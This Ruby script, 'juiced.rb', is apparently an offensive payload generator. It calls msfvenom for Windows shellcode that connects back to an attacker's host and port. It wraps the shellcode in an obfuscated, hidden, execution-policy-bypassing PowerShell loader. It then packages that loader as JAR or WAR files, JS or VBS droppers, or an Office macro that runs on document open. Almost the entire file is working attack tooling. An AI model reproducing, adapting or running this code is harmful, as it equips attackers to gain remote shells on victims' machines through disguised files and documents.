#!/usr/bin/env ruby
#Author: Andrew Bonstrom
#v1.2
#Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
require 'io/console'
require 'base64'
def usage
	puts "Usage: ruby juiced.rb MsfvenomPayload Lhost Lport payloadFlag PayloadName\n"
	puts "Note: Payload name required for payloads that output a file." 
	puts "Payload Options: jar, war, macro, ps, vbs, and js."
end
#######################################################################################################################
#Payload Functions Begin
#######################################################################################################################
#This first is for creating a jar file that executes the base64 encoded powershell syntax
def gen_jarFile (base64Command, fileName)
	#Building the .java one liner
	javaFile1 = 'import java.io.*;public class' + ' ' +fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("' 
        javaFile2 = javaFile1 + base64Command + '");}catch(IOException e1){}}}'
	#Write the one liner to a file.Name.java
	File.open(fileName+".java", "w") do |f|     
		f.write(javaFile2)   
	end
	#Creates manifest file
	File.open("manifest.txt", "w") do |f|
		f.write('Main-Class: ' + 'fileName')
	end
	#Builds and executes command to compile .java into .class
	#Then it creates the jar file and cleans up
	exec ('javac ' + fileName + '.java&&jar -cvfm ' + fileName + '.jar manifest.txt ' + fileName + '.class&&rm -f '+ fileName + '.class ' + fileName + '.java manifest.txt')
end
#This second will create a fully copy/pasta word macro
def gen_Macro (content)
#Adds initial double quotes
	content = '"' + content
#Split every 200 chars and then rejoin with newline and string continuation in order to meet the string var limitation
	content = content.scan(/.{1,200}/).join("\" & _\r\n\"")
	content += '"'
#Splits the shellcode at the 4500 char point because thats roughly 24-25 lines for the first var
	first, second = content.slice!(0...4500), content
#Formats the output for the VBA macro
#Due to VBA restrictions for the number lines used during string concatenation of 24 lines we split
#the shell amongst two different variables and then concatenate the contents in a third variable
	puts "Option Explicit"
	puts "Sub GetShellcode()"
	puts    "\t" + "On Error Resume Next"
	puts    "\t" + "Dim wsh As Object\n"
	puts    "\t" + 'Set wsh = CreateObject("WScript.Shell")'
	puts    "\t" + "Dim f1 As String\n"
	puts    "\t" + "Dim f2 As String\n"
	puts    "\t" + "Dim f3 As String\n"
	puts    "\t" + "f1 = " + first + '"'
	puts    "\n"
	puts    "\t" + "f2 = " + '"' + second
	puts    "\t" + "f3 = f1 & f2\n"
	puts    "\t" + "wsh.Run f3, 0"
	puts    "\t" + "On Error GoTo 0"
	puts "End Sub"
	puts "Sub AutoOpen()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
	puts "Sub Workbook_Open()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
end
def gen_psCommand(base64Command)
	return base64Command 
end
def gen_jsFile(base64Command, fileName)
	str = 'var WshShell = new ActiveXObject("Wscript.Shell");WshShell.run("shellcode", 0, false);WScript.exit;'.to_s.sub("shellcode", base64Command)
	File.open(fileName + ".js", "w") do |f|
        	f.write(str)
        end
end
def gen_vbsFile(base64Command, fileName)
	str = 'CreateObject("Wscript.Shell").Run "shellcode", 0, False'.to_s.sub("shellcode", base64Command)
	        File.open(fileName + ".vbs", "w") do |f|
                f.write(str)
        	end
end
def gen_warFile(base64Command, fileName)
	#Creates the web.xml file to point to the .jsp servlet
        File.open("web.xml", "w") do |f|
                tempWebStr = <<-EOS1
<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>fileName</servlet-name>
<jsp-file>/fileName.jsp</jsp-file>
</servlet>
</web-app>
EOS1
f.write(tempWebStr.to_s.gsub("fileName", fileName))
	end
        #Creates JSP file
        File.open(fileName+".jsp", "w") do |f|
                tempJspStr = <<-EOS2
<%@ page import="java.io.*" %>
<% 
Process p=Runtime.getRuntime().exec("base64Command");
%>
EOS2
                f.write(tempJspStr.to_s.sub("base64Command", base64Command))
	end
	exec ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
end
##################################################################################################################
#Payload Functions End
##################################################################################################################
#Formats Msfvenom output to byte code array
def format_shellcode(content)
	#Formats shellcode by replacing \ with ,0
	content = content.gsub!('\\', ",0")
	#Deletes instances of double quote
	content = content.delete ('"')
	#Deletes instances of semi colon
	content = content.delete (";")
	#Slices all content up until the first piece of byte code
	content = content.slice(content.index(",0x")..-1)
	#Strips out newline chars to create a single line	
	content = content.gsub("\n","")
	#Strips the first comma off
	content = content[1..-1]
	return content
end
#Creates msfvenom command based on user input so far
def generate_shellcode (payload, lhost, lport)
	newVar = ''
	formattedShellcode = ''
	#Build the msfvenom command from user input
	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
	puts "Now running" +  command
	#Runs commands within sub process, sleeps for 5 seconds while msfvenom builds the shellcode and then assigns it to a variable
	IO.popen(command) do |f|
		sleep(5)
		newVar = f.read
	end
	#Msfvenom output is sent to format function
	formattedShellcode = format_shellcode(newVar)
	
	return formattedShellcode
end
def gen_command(shellcode)
	str = <<-EOS
	$var = '$RgJTJokYRNwbHQ = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$JLOgmnlpEHlaQgk = Add-Type -memberDefinition $RgJTJokYRNwbHQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $xuigDWqpcchqI = shellcodehere;$cDPWgScbWjEED = $JLOgmnlpEHlaQgk::VirtualAlloc(0,[Math]::Max($xuigDWqpcchqI.Length,0x1000),0x3000,0x40);for ($OArfsQVSOrBoW=0;$OArfsQVSOrBoW -le ($xuigDWqpcchqI.Length-1);$OArfsQVSOrBoW++){$JLOgmnlpEHlaQgk::memset([IntPtr]($cDPWgScbWjEED.ToInt32()+$OArfsQVSOrBoW), $xuigDWqpcchqI[$OArfsQVSOrBoW], 1) | Out-Null};$JLOgmnlpEHlaQgk::CreateThread(0,0,$cDPWgScbWjEED,0,0,0);for (;;){Start-sleep 60};';$newVar = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($var));$arch = $ENV:Processor_Architecture;if($arch -ne'x86'){$cmd = "%systemroot%\syswow64\windowspowershell\v1.0\powershell.exe -windowstyle hidden -enc ";iex $cmd $newVar}else{iex "$var"};
EOS
	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
	return mainStr
end
#################################################################################
#Main
#################################################################################
if ARGV.empty?
	usage
else
	temp = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
	#Call function to base64 encode everything and issue out powershell command
	command = gen_command(temp)
	#Case switch statement for different payload flags
	case ARGV[3]
	when "jar"
		puts "Now creating file with .jar extension, please check local directory."
		gen_jarFile(command, ARGV[4])
	when "ps"
		puts gen_psCommand(command)
	when "macro"
		puts "Now creating Copy/Pastable Word Macro...."
		gen_Macro(command)
	when "js"
		puts "Now creating file with .js extension, please check local directory."
		gen_jsFile(command, ARGV[4])
	when "vbs"
		puts "Now creating file with .vbs extension, please check local directory."
		gen_vbsFile(command, ARGV[4])
	when "war"
		puts "Now creating file with .war extension, please check local directory."
		gen_warFile(command, ARGV[4])
	else
	puts "You forgot to specify a payload."
	end
end
